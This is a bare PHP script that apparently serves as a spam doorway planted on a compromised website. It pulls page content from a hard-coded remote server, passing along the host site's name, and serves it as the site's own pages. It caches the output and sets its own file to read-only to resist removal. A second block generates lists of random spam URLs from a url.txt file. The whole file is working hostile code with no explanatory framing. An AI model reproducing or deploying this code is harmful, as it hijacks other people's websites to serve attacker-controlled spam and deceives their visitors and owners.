<?php
set_time_limit(0);
$dir="./";
$_time=0;
createFolder($dir);
function createFolder($path) 
{ 
if (!file_exists($path)) 
{ 
createFolder(dirname($path)); 
mkdir($path, 0444); 
} 
} 
function cache_start($_time, $dir)
{
  $cachefile = $dir.'/'.sha1($_SERVER['REQUEST_URI']).'.html';
  ob_start();
  if(file_exists($cachefile))
  {
    include($cachefile);
    ob_end_flush();
    exit;
  }
}
function cache_end($dir)
{
  $cachefile = $dir.'/'.sha1($_SERVER['REQUEST_URI']).'.html';
  $fp = fopen($cachefile, 'w');
  fwrite($fp, ob_get_contents());
  fclose($fp);
  ob_end_flush();
}
cache_start($_time, $dir);
header("Content-Type: text/html;charset=gb2312");
$Remote_server = "http://172.107.70.166:166/"; 
$host_name = "http://".$_SERVER['SERVER_NAME'].$_SERVER['PHP_SELF'];
$Content_mb=getHTTPPage($Remote_server."/index.php?host=".$host_name);
function getHTTPPage($url) {
	$opts = array(
	  'http'=>array(
		'method'=>"GET",
		'header'=>"User-Agent: aQ0O010O"
	  )
	);
	$context = stream_context_create($opts);
	$html = @file_get_contents($url, false, $context);
	if (empty($html)) {
		exit("<p align='center'><font color='red'><b>Connection Error!</b></font></p>");
	}	
	return $html;
} 

echo $Content_mb;
$url1 = $_SERVER['PHP_SELF'];  
$filename1 = @end(explode('/',$url1));  
function set_writeable($file_name)
{
@chmod($file_name,0444);

} 
set_writeable($filename1);
cache_end($dir);
?>


<?php 

if($_POST[Submit]){


set_time_limit(0);
error_reporting(0);
header("Content-type: text/html; charset=gb2312"); 
$Titleline=file('url.txt');
$fks=$_POST["fks"];

function createRandomStr($length){ 
$str = '0123456789ZXCVBNMLKJHGFDSAQWERTYUIOPqazwsxedcrfvtgbyhnujmiklop';
$strlen = 62; 
while($length > $strlen){ 
$str .= $str; 
$strlen += 62; 
} 
$str = str_shuffle($str); 
return substr($str,0,$length); 
} 

function gettitle($id)
{
global $Titleline;
$str=$Titleline[$id];
return $str;
}
for($aabb=0;$aabb<count($Titleline);$aabb++)
{ 
for($iik=1;$iik<$fks+1;$iik++){
echo trim(gettitle($aabb))."?".createRandomStr(5).".html</br>";
}
}
}

?> 
